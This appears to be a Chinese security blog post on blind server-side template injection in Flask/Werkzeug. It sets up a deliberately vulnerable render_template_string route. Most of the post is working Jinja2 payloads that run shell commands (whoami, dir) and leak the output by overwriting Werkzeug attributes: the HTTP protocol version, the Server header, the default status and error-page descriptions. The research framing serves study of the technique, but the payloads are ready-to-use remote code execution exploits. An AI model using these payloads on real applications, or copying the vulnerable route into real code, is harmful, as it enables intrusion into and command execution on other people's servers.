@@ -1,0 +1,245 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="1c06c34d21214e2b03d03804369999eb">Werkzeug应用无回显详细深入调试研究</h2>
+<p>上一篇我们深入调试分析了 Pyramid 应用wsgiref的内存马无回显利用，这篇我们是分析另一个web应用 Werkzeug<br/>
+Werkzeug 是一个用于 Web 开发的强大工具包，主要用于处理 WSGI 请求和响应。它提供了许多实用的功能，使得开发 Web 应用程序变得更加容易和高效。Werkzeug 是 Flask 框架的基础之一，但它也可以独立使用。</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span><span class="n">render_template</span><span class="p">,</span> <span class="n">render_template_string</span>  
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>  
+
+<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>  
+<span class="k">def</span> <span class="nf">template</span><span class="p">():</span>  
+        <span class="n">template</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"code"</span><span class="p">)</span>  
+        <span class="n">result</span><span class="o">=</span><span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>  
+        <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>  
+        <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span><span class="bp">None</span><span class="p">:</span>  
+            <span class="k">return</span> <span class="s2">"OK"</span>  
+        <span class="k">else</span><span class="p">:</span>  
+            <span class="k">return</span> <span class="s2">"error"</span>  
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>  
+    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">'0.0.0.0'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8000</span><span class="p">)</span>
+</pre></div>
+<p>想将回显带出到http响应中就可以考虑改变response包中对应位置属性的值</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091654-c66758e0-b826-1.png"/></p>
+<p>调试app.run()先看一下run函数的源代码</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">run</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"FLASK_RUN_FROM_CLI"</span><span class="p">)</span> <span class="o">==</span> <span class="s2">"true"</span><span class="p">:</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">is_running_from_reloader</span><span class="p">():</span>
+                <span class="n">click</span><span class="o">.</span><span class="n">secho</span><span class="p">(</span>
+                    <span class="s2">" * Ignoring a call to 'app.run()' that would block"</span>
+                    <span class="s2">" the current 'flask' CLI command.</span><span class="se">\n</span><span class="s2">"</span>
+                    <span class="s2">"   Only call 'app.run()' in an 'if __name__ =="</span>
+                    <span class="s1">' "__main__"</span><span class="se">\'</span><span class="s1"> guard.'</span><span class="p">,</span>
+                    <span class="n">fg</span><span class="o">=</span><span class="s2">"red"</span><span class="p">,</span>
+                <span class="p">)</span>
+
+            <span class="k">return</span>
+
+        <span class="k">if</span> <span class="n">get_load_dotenv</span><span class="p">(</span><span class="n">load_dotenv</span><span class="p">):</span>
+            <span class="n">cli</span><span class="o">.</span><span class="n">load_dotenv</span><span class="p">()</span>
+
+            <span class="c1"># if set, env var overrides existing value</span>
+            <span class="k">if</span> <span class="s2">"FLASK_DEBUG"</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">:</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="n">get_debug_flag</span><span class="p">()</span>
+
+        <span class="c1"># debug passed to method overrides all other sources</span>
+        <span class="k">if</span> <span class="n">debug</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="nb">bool</span><span class="p">(</span><span class="n">debug</span><span class="p">)</span>
+
+        <span class="n">server_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"SERVER_NAME"</span><span class="p">)</span>
+        <span class="n">sn_host</span> <span class="o">=</span> <span class="n">sn_port</span> <span class="o">=</span> <span class="bp">None</span>
+
+        <span class="k">if</span> <span class="n">server_name</span><span class="p">:</span>
+            <span class="n">sn_host</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">sn_port</span> <span class="o">=</span> <span class="n">server_name</span><span class="o">.</span><span class="n">partition</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="ow">not</span> <span class="n">host</span><span class="p">:</span>
+            <span class="k">if</span> <span class="n">sn_host</span><span class="p">:</span>
+                <span class="n">host</span> <span class="o">=</span> <span class="n">sn_host</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">host</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>
+
+        <span class="k">if</span> <span class="n">port</span> <span class="ow">or</span> <span class="n">port</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">sn_port</span><span class="p">:</span>
+            <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sn_port</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">port</span> <span class="o">=</span> <span class="mi">5000</span>
+
+        <span class="n">options</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s2">"use_reloader"</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">debug</span><span class="p">)</span>
+        <span class="n">options</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s2">"use_debugger"</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">debug</span><span class="p">)</span>
+        <span class="n">options</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s2">"threaded"</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
+
+        <span class="n">cli</span><span class="o">.</span><span class="n">show_server_banner</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">debug</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">name</span><span class="p">)</span>
+
+        <span class="kn">from</span> <span class="nn">werkzeug.serving</span> <span class="kn">import</span> <span class="n">run_simple</span>
+
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">run_simple</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">host</span><span class="p">),</span> <span class="n">port</span><span class="p">,</span> <span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">options</span><span class="p">)</span>
+        <span class="k">finally</span><span class="p">:</span>
+            <span class="c1"># reset the first request information if the development server</span>
+            <span class="c1"># reset normally.  This makes it possible to restart the server</span>
+            <span class="c1"># without reloader and that stuff from an interactive shell.</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">_got_first_request</span> <span class="o">=</span> <span class="bp">False</span>
+</pre></div>
+<p>通过调试跟踪到<strong>create_jinja_environment</strong>函数，作用创建jinjia环境全局变量：就有我们SSTI熟悉利用的<code>url_for</code>，<code>get_flashed_messages</code>，<code>config</code>，<code>request</code>，<code>sessoin</code>，<code>g</code></p>
+<div class="highlight"><pre><span></span><span class="n">rv</span><span class="o">.</span><span class="n">globals</span><span class="o">.</span><span class="n">update</span><span class="p">(</span>  
+    <span class="n">url_for</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">url_for</span><span class="p">,</span>  
+    <span class="n">get_flashed_messages</span><span class="o">=</span><span class="n">get_flashed_messages</span><span class="p">,</span>  
+    <span class="n">config</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">config</span><span class="p">,</span>  
+    <span class="c1"># request, session and g are normally added with the  </span>
+    <span class="c1"># context processor for efficiency reasons but for imported    # templates we also want the proxies in there.    request=request,  </span>
+    <span class="n">session</span><span class="o">=</span><span class="n">session</span><span class="p">,</span>  
+    <span class="n">g</span><span class="o">=</span><span class="n">g</span><span class="p">,</span>  
+<span class="p">)</span>  
+<span class="n">rv</span><span class="o">.</span><span class="n">policies</span><span class="p">[</span><span class="s2">"json.dumps_function"</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span>
+<span class="k">return</span> <span class="n">rv</span>
+</pre></div>
+<p>之后是设置运行时的配置</p>
+<div class="highlight"><pre><span></span><span class="n">options</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s2">"use_reloader"</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">debug</span><span class="p">)</span>  
+<span class="n">options</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s2">"use_debugger"</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">debug</span><span class="p">)</span>  
+<span class="n">options</span><span class="o">.</span><span class="n">setdefault</span><span class="p">(</span><span class="s2">"threaded"</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
+</pre></div>
+<ul>
+<li>
+<code>use_reloader</code> 和 <code>use_debugger</code> 的值通常取决于应用的调试模式（<code>self.debug</code>）。</li>
+<li>
+<code>threaded</code> 默认为 <code>True</code>，意味着 Flask 会启用多线程处理请求。</li>
+</ul>
+<p>紧接着使用了 <code>werkzeug.serving.run_simple</code> 函数来启动一个简单的 Web 服务器</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">werkzeug.serving</span> <span class="kn">import</span> <span class="n">run_simple</span>  
+
+<span class="k">try</span><span class="p">:</span>  
+    <span class="n">run_simple</span><span class="p">(</span><span class="n">t</span><span class="o">.</span><span class="n">cast</span><span class="p">(</span><span class="nb">str</span><span class="p">,</span> <span class="n">host</span><span class="p">),</span> <span class="n">port</span><span class="p">,</span> <span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">options</span><span class="p">)</span>
+     <span class="o">...</span>
+</pre></div>
+<h2 data-content="1" id="1a2f43b128f23216c78bf47b82a868cd">WSGIRequestHandler篡改</h2>
+<p>跟踪进去发现调用了make_server</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091709-cee11c40-b826-1.png"/></p>
+<p>make_server用于根据传入的参数（如 <code>threaded</code> 和 <code>processes</code>）创建一个合适的 WSGI 服务器实例。由之前分析可以看到<strong>app.run默认的的threaded为true</strong>所以创建<code>ThreadedWSGIServer</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091719-d4dc5a42-b826-1.png"/></p>
+<p>继续跟踪发现创建WSGI服务时的<code>WSGIRequestHandler</code> 是一个默认的请求处理器</p>
+<p>检查 <code>handler</code> 是否具有 <code>protocol_version</code> 属性（即请求处理器是否指定了 <strong>HTTP 协议版本</strong>）。如果没有指定，则自动将 <code>protocol_version</code> 设置为 <code>HTTP/1.1</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091726-d97c7050-b826-1.png"/></p>
+<p>看到这里我们便想可不可以改变协议值来回显？不急我们跟进<strong>WSGIRequestHandler</strong>细看一番</p>
+<p>发现header段值都是通过sead_header来设置的，那么我们查找调用这个方法的位置就可以</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091735-de8ca8da-b826-1.png"/></p>
+<h3 data-content="1" id="57257a53f44d7162136ac389b75c387e">HTTP协议头回显</h3>
+<p>首先我们看一下handler这个类， protocol_version时他的一个属性</p>
+<div class="highlight"><pre><span></span>werkzeug.serving.WSGIRequestHandler.protocol_version
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091744-e3c95bfe-b826-1.png"/></p>
+<p>接下来就需要获取werkzeug这个模块</p>
+<blockquote>
+<p>sys.modules是一个全局字典，该字典是python启动后就加载在内存中。每当程序员导入新的模块，sys.modules都将记录这些模块。字典sys.modules对于加载模块起到了缓冲的作用。当某个模块第一次导入，字典sys.modules将自动记录该模块。当第二次再导入该模块时，python会直接到字典中查找，从而加快了程序运行的速度。<br/>
+&gt;</p>
+</blockquote>
+<p>比如我们调试过程也可以看到<strong>sys的<strong>main</strong>模块中就可以拿到app模块</strong></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091753-e9105482-b826-1.png"/></p>
+<p>也就是SSTI传参可以这样得到</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>g.get<span class="p">[</span><span class="s">"__globals__"</span><span class="p">]</span><span class="m">.</span>sys.modules.werkzeug.serving.WSGIRequestHandler<span class="p">}}</span>
+</pre></div>
+<p>接下来就可以设置protocol_version属性回显</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>lipsum.__globals__.__builtins__.setattr<span class="p">(</span>g.get<span class="p">[</span><span class="s">"__globals__"</span><span class="p">]</span><span class="m">.</span>sys.modules.werkzeug.serving.WSGIRequestHandler<span class="p">,</span><span class="s">"protocol_version"</span><span class="p">,</span>lipsum.__globals__.__builtins__.__import__<span class="p">(</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span><span class="m">.</span>read<span class="p">())}}</span>
+</pre></div>
+<p>测试成功回显在HTTP协议头</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091802-ef012394-b826-1.png"/></p>
+<h3 data-content="1" id="1847591ae65538cce3e94a43c17b40de">Server字段回显</h3>
+<p>我们调试跟踪找到send_response函数，里面是对Server字段值的设置</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091810-f385325c-b826-1.png"/></p>
+<p>跟踪进去发现是server_version  + self.sys_version</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">version_string</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>  
+    <span class="sd">"""Return the server software version string."""</span>  
+    <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">server_version</span> <span class="o">+</span> <span class="s1">' '</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">sys_version</span>
+</pre></div>
+<p>跟踪找到两个都是BaseHTTPRequestHandler的属性</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091818-f84751da-b826-1.png"/></p>
+<p>发包调试发现其实调用的是子类WSGIRequestHandler的server_version方法</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091827-fd539b8e-b826-1.png"/></p>
+<p>需要注意的是：</p>
+<ul>
+<li>
+<code>@property</code> 是 Python 中的一个内置装饰器，用来将类的方法转换为只读属性。也就是说，这个方法可以像访问普通属性一样被调用，而不需要显式调用方法（不加括号）。</li>
+<li>例如，<code>server_version</code> 在外部可以通过 <code>server.server_version</code> 进行访问</li>
+</ul>
+<p>SSTI设置server_version和sys_version的值</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">[</span><span class="s2">"__globals__"</span><span class="p">]</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">serving</span><span class="o">.</span><span class="n">WSGIRequestHandler</span><span class="p">,</span><span class="s2">"server_version"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+
+<span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">[</span><span class="s2">"__globals__"</span><span class="p">]</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">serving</span><span class="o">.</span><span class="n">WSGIRequestHandler</span><span class="p">,</span><span class="s2">"sys_version"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p>成功外带到Server头</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091835-029e94fe-b827-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>lipsum.__globals__.__builtins__.setattr<span class="p">(</span>g.get<span class="p">[</span><span class="s">"__globals__"</span><span class="p">]</span><span class="m">.</span>sys.modules.werkzeug.serving.ThreadedWSGIServer<span class="p">,</span><span class="s">"sys_version"</span><span class="p">,</span>lipsum.__globals__.__builtins__.__import__<span class="p">(</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span><span class="m">.</span>read<span class="p">())}}</span>
+</pre></div>
+<h2 data-content="1" id="3eade67b3470a8eb647554d5f5b16180">werkzeug.exceptions篡改</h2>
+<p><strong><code>werkzeug.exceptions</code></strong></p>
+<ul>
+<li>提供了常见 HTTP 错误的封装。</li>
+<li>主要功能：<ul>
+<li>各种 HTTP 状态码对应的异常类，例如 <code>NotFound</code>、<code>BadRequest</code>。</li>
+<li>支持通过异常直接触发 HTTP 响应。</li>
+</ul>
+</li>
+<li>典型用途：处理错误并返回适当的 HTTP 响应。</li>
+</ul>
+<p>我们想找到一些错误页面固定值的比如500状态码：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091846-08d66e14-b827-1.png"/></p>
+<p>如果要篡改这些我们来到werkzeug.exceptions，发现直接就是写好的值，我们获取到这个类<code>werkzeug.exceptions.InternalServerError</code>就能篡改属性</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091853-0cf55dfc-b827-1.png"/></p>
+<p>我们先改变description的值然后触发500观察页面发现成功回显</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">[</span><span class="s2">"__globals__"</span><span class="p">]</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InternalServerError</span><span class="p">,</span><span class="s2">"description"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091940-28ebe0b2-b827-1.png"/></p>
+<p>同理还可以改变405的内容</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091948-2dfb6f96-b827-1.png"/></p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">[</span><span class="s2">"__globals__"</span><span class="p">]</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">MethodNotAllowed</span><span class="p">,</span><span class="s2">"description"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212091956-32e6028c-b827-1.png"/></p>
+<h2 data-content="1" id="58a31ae2d7355e729d8ae83396dd070a">werkzeug.wrappers篡改</h2>
+<p><strong><code>werkzeug.wrappers</code></strong></p>
+<ul>
+<li>提供了对 HTTP 请求和响应的封装。</li>
+<li>主要类：<ul>
+<li>
+<code>Request</code>：用于封装 WSGI 请求，支持处理表单数据、文件上传等。</li>
+<li>
+<code>Response</code>：用于封装 WSGI 响应，支持设置响应头、内容类型等。</li>
+</ul>
+</li>
+<li>典型用途：处理 HTTP 请求和构建 HTTP 响应。<br/>
+在初始化打点调试跟踪，发现status赋值从default_status来，而他的值是默认的200</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212092008-39a249e6-b827-1.png"/></p>
+<p>那么我们改变default_status的值就可以</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">[</span><span class="s2">"__globals__"</span><span class="p">]</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">wrappers</span><span class="o">.</span><span class="n">Response</span><span class="p">,</span><span class="s2">"default_status"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p>由于输出有中文需要base64编码</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">g</span><span class="o">.</span><span class="n">get</span><span class="p">[</span><span class="s2">"__globals__"</span><span class="p">]</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">wrappers</span><span class="o">.</span><span class="n">Response</span><span class="p">,</span><span class="s2">"default_status"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'base64'</span><span class="p">)</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'whoami'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">decode</span><span class="p">())}}</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241212092017-3f6e9e42-b827-1.png"/></p>
+<h2 data-content="1" id="c1b25eab5c81c0cb71a5935184103236">总结</h2>
+<p>Server头字段外带<br/>
+<a href="https://xz.aliyun.com/t/15780?time__1311=GqjxnQGQDQO4l6zG7DymKH0QL3AIo%3D43x#toc-4" target="_blank">Jinja2-SSTI通过Server请求头带出命令回显 - 先知社区 (aliyun.com)</a></p>
+<p><code>setattr</code> 是一个内置函数，用于设置对象的属性值。它的签名是 <strong><code>setattr(obj, name, value)</code></strong>。</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>g.pop.__globals__.__builtins__.setattr<span class="p">(</span>g.pop.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler<span class="p">,</span><span class="s">"server_version"</span><span class="p">,</span>g.pop.__globals__.__builtins__.__import__<span class="p">(</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'whoami'</span><span class="p">)</span><span class="m">.</span>read<span class="p">())}}</span>
+
+<span class="p">{{</span>lipsum.__globals__.__builtins__.setattr<span class="p">(</span>lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.serving.WSGIRequestHandler<span class="p">,</span><span class="s">"server_version"</span><span class="p">,</span>lipsum.__globals__.__builtins__.__import__<span class="p">(</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'echo%20success'</span><span class="p">)</span><span class="m">.</span>read<span class="p">())}}</span>
+</pre></div>
+<ul>
+<li>使用 <code>setattr</code> 函数设置 <code>werkzeug.serving.WSGIRequestHandler</code> 类的 <code>server_version</code> 属性。</li>
+</ul>
+<p>http协议回显</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">setattr</span><span class="p">(</span><span class="n">lipsum</span><span class="o">.</span><span class="n">__spec__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">sys</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">werkzeug</span><span class="o">.</span><span class="n">serving</span><span class="o">.</span><span class="n">WSGIRequestHandler</span><span class="p">,</span><span class="s2">"protocol_version"</span><span class="p">,</span><span class="n">lipsum</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="o">.</span><span class="n">__import__</span><span class="p">(</span><span class="s1">'os'</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">'echo</span><span class="si">%20s</span><span class="s1">uccess'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())}}</span>
+</pre></div>
+<p>状态码回显<br/>
+请求头无法返回非ascii码字符，即我们需要使用<strong>编码</strong>来输出命令执行的结果。</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>url_for.__globals__.__builtins__<span class="p">[</span><span class="s">'setattr'</span><span class="p">](</span>lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.wrappers.Response<span class="p">,</span><span class="s">'default_status'</span><span class="p">,</span>url_for.__globals__.__builtins__.__import__<span class="p">(</span><span class="s">'base64'</span><span class="p">)</span><span class="m">.</span>b64encode<span class="p">(</span>url_for.__globals__.__builtins__<span class="p">[</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'dir'</span><span class="p">)</span><span class="m">.</span>read<span class="p">()</span><span class="m">.</span>encode<span class="p">())</span><span class="m">.</span>decode<span class="p">())}}</span>
+</pre></div>
+<p>错误页面回显</p>
+<p>比如：500状态码</p>
+<div class="highlight"><pre><span></span><span class="p">{{</span>url_for.__globals__.__builtins__<span class="p">[</span><span class="s">'setattr'</span><span class="p">](</span>lipsum.__spec__.__init__.__globals__.sys.modules.werkzeug.exceptions.InternalServerError<span class="p">,</span><span class="s">'description'</span><span class="p">,</span>url_for.__globals__.__builtins__<span class="p">[</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)</span><span class="m">.</span>popen<span class="p">(</span><span class="s">'dir'</span><span class="p">)</span><span class="m">.</span>read<span class="p">())}}</span>
+</pre></div>
+<p>404状态</p>
